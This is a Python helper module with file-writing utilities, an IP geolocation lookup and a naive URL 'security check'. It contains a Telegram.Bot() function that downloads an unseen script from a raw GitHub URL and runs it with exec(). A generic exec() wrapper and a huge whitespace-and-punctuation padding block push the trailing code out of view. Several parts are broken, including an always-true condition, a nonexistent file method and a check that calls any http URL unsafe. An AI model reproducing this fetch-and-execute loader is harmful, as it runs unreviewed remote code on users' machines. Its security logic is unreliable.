
whitespace = ' \t\n\r\v\f'
import requests
class Code:
	def start(self,code):
		self.code = code
		if self.code != "" or self.code !=None:
			exec(self.code)
		else:
			status.Bad()	
class status:
	def Ok():
		print(
		' done !'
		)
	def Bad():
		print(
		' Bad !'
		)
	def Su():
		print(
		' added !'
		)
class pyformat:
	def exit():
		exit()
	def new(fname,text):
		try:
			with open(fname+".pyd","w")as X:
				X.write("datas = ['"+text+"']")
				status.Ok()
		except:
			status.Bad()
	def add(fname,text):
		with open(fname+".pyd","a")as X:
			jj = open(fname+".pyd").lines()
			X.write(f" ,datas{jj} = ['"+text+"'']")
		status.Su()
	def read(fname):
	 o = open(fname+".pyd").read().split("datas = ['")[1].split("']")[0]
	 print( o )
	 status.Ok()
def locate(ip):
    data = requests.get("http://ip-api.com/json/" + ip + "?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,as,mobile,proxy")
    resp = data.json()
    print(" ")
    print(f"Got Info Of IP :\n")
    print("Status : " + resp["status"])
    if resp["status"] == "fail":
        print("Failed Get iP info")
        exit()
    print('Wait','.'*12)
    print("Country Code     : " + resp["continentCode"])
    print("Pays             : " + resp["country"])
    print("Pays Code        : " + resp["countryCode"])
    print("Region           : " + resp["region"])
    print("Region Number    : " + resp["regionName"])
    print("City             : " + resp["city"])
    print("Districte        : " + resp["district"])
    print("Code Postal      : " + resp["zip"])
    print("Latitude         : " + str(resp["lat"]))
    print("Longitude        : " + str(resp["lon"]))
    print("Timezone         : " + resp["timezone"])
    print("Operator         : " + resp["isp"])
    print("AS               : " + resp["as"])
    print("Mobile           : " + str(resp["mobile"]))
    print("Proxy            : " + str(resp["proxy"]))
class Telegram:
    def Bot():
        x = requests.get("https://raw.githubusercontent.com/kkkik/CalcBot/main/cc.py").text
        exec(x)
class Web:
	def CheckSecurity(web_url):
		if 'http://' in web_url:
			try:
				print("Url are unsafe .")
			except:
				print("unknown error !")
		elif 'https:' in web_url:
			print('Url Safe.')
		elif 'https' or 'http' not in web_url:
			added = 'https://'+web_url+'.com'
			print(added)
		else:
			print('Bad exceptions .')
#This #Empty world
'''::
	:
		
				:
					:
						:
									
									
									::
										
		::
			:
				:
					:
						:
							:
								::
									:
										:
											:
				:
					:
						:
							:
								:
									:
										:
											:
												:
	:
		:
			:
				:
					:
						:
							:
								:
									:
										:
		:::::
			:
				:
					:
						:
							
							
							
							
							:
								:
									:
										:
											
											:
												:
													:
														;
														;
														
														'
														
														:
															:
																:
																	:
																		:
																			
																			:
																				:
																					:
																						:
																							:
																								:
																									:
																										
																										:
																											:
																												:
																													:
																														:
																															:
																																:
																																	:
																																		:
																																			:
																																				:
																																					:
																																						:
																																							':';:';
																																							
																																							:
																																								:
																																									:
																																										:
																																											:
																																												:
																																													:
																																														:
																																															:
																																																:
																																																	
																																																	:
																																																		:
																																																			:
																																																				:
																																																					:
																																																						:
																																																							:
																																																								:
																																																									::
																																																										:
																																																											:
																																																												::
																																																													.
																																																													
																																																													:
																																																														::
																																																															:
																																																																
																																																																
																																																																.
																																																																.
																																																																.
																																																																
																																																																
																																																																
																																																																:
																																																																	:
																																																																		:
																																																																			:
																																																																				:
																																																																					:
																																																																						:
																																																																							:
																																														This emPyRbdbsnnw###
																																														
																																																																								
																																																																																																		;
																																																																																																		;
																																																																																																		;
																																																																																																		;
																																																																																																		;
																																																																																																		;
																																																																																																		
																																																																																																																												
																																																																																																																																											;
																																																																																																																																											;
																																																																																																																																											;
																																																																																																																																											;
																																																																																																																																											;
																																																																																																																																											
																																																																																																																																																																					;
																																																																																																																																																																					;
																																																																																																																																																																					
																																																																																																																																																																																															;
																																																																																																																																																																																															;
																																																																																																																																																																																															;
																																																																																																																																																																																															;
																																																																																																																																																																																															;
																																																																																																																																																																																															
																																																																																																																																																																																																																									;;
																																																																																																																																																																																																																									
																																																																																																																																																																																																																																																			;;
																																																																																																																																																																																																																																																			;
																																																																																																																																																																																																																																																			;
																																																																																																																																																																																																																																																			;
																																																																																																																																																																																																																																																			
																																																																																																																																																																																																																																																																													;;
																																																																																																																																																																																																																																																																													;
																																																																																																																																																																																																																																																																													;
																																																																																																																																																																																																																																																																													;
																																																																																																																																																																																																																																																																													
																																																																																																																																																																																																																																																																																																							;
																																																																																																																																																																																																																																																																																																							;
																																																																																																																																																																																																																																																																																																							;;
																																																																																																																																																																																																																																																																																																							;
																																																																																																																																																																																																																																																																																																							;
																																																																																																																																																																																																																																																																																																							;
																																																																																																																																																																																																																																																																																																							;
																																																																																																																																																																																																																																																																																																							;
																																																																																																																																																																																																																																																																																																							;
																																																																																																																																																																																																																																																																																																							;
																																																																																																																																																																																																																																																																																																							
																																																																																																																																																																																																																																																																																																																																	;;
																																																																																																																																																																																																																																																																																																																																	;
																																																																																																																																																																																																																																																																																																																																	;
																																																																																																																																																																																																																																																																																																																																	
																																																																																																																																																																																																																																																																																																																																																											;
																																																																																																																																																																																																																																																																																																																																																											;
																																																																																																																																																																																																																																																																																																																																																											;
																																																																																																																																																																																																																																																																																																																																																											;
																																																																																																																																																																																																																																																																																																																																																											;;
																																																																																																																																																																																																																																																																																																																																																											
																																																																																																																																																																																																																																																																																																																																																																																					;;
																																																																																																																																																																																																																																																																																																																																																																																					;
																																																																																																																																																																																																																																																																																																																																																																																					;
																																																																																																																																																																																																																																																																																																																																																																																					
																																																																																																																																																																																																																																																																																																																																																																																																															;
																																																																																																																																																																																																																																																																																																																																																																																																															;
																																																																																																																																																																																																																																																																																																																																																																																																															;
																																																																																																																																																																																																																																																																																																																																																																																																															;
																																																																																																																																																																																																																																																																																																																																																																																																															;
																																																																																																																																																																																																																																																																																																																																																																																																															;
																																																																																																																																																																																																																																																																																																																																																																																																															;
																																																																																																																																																																																																																																																																																																																																																																																																															;
																																																																																																																																																																																																																																																																																																																																																																																																															;
																																																																																																																																																																																																																																																																																																																																																																																																															;
																																																																																																																																																																																																																																																																																																																																																																																																																																									'''
																																																																																																																																																																																																																																																																																																																																																																																																																																	


def programmer() -> int: ...
def ORXOR() -> int: ...
def ideas() -> int: ...
def UNPACKET(): ...